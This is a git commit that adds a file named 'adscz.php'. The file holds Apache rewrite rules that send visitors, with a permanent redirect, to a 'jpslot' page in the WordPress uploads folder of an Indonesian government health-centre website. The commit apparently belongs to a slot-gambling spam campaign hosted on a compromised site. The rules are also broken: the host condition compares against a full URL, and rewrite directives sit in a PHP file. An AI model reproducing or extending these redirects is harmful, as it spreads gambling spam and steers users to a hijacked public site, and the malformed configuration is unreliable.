6c410284deaeabdd4d193ee81e8f69d655e545d5
xmlrpcs <127653439+xmlrpcs@users.noreply.github.com>
2024-02-15 13:39:55 +0700

    Create adscz.php

---
+++ adscz.php
@@ -0,0 +1,3 @@
+RewriteEngine On
+RewriteCond %{HTTP_HOST} ^https://puskesmasperumnasutara.cirebonkota.go.id/wp-content/uploads/2022/jpslot/index.php
+RewriteRule (.*) https://puskesmasperumnasutara.cirebonkota.go.id/wp-content/uploads/2022/jpslot/$1 [R=301,L]
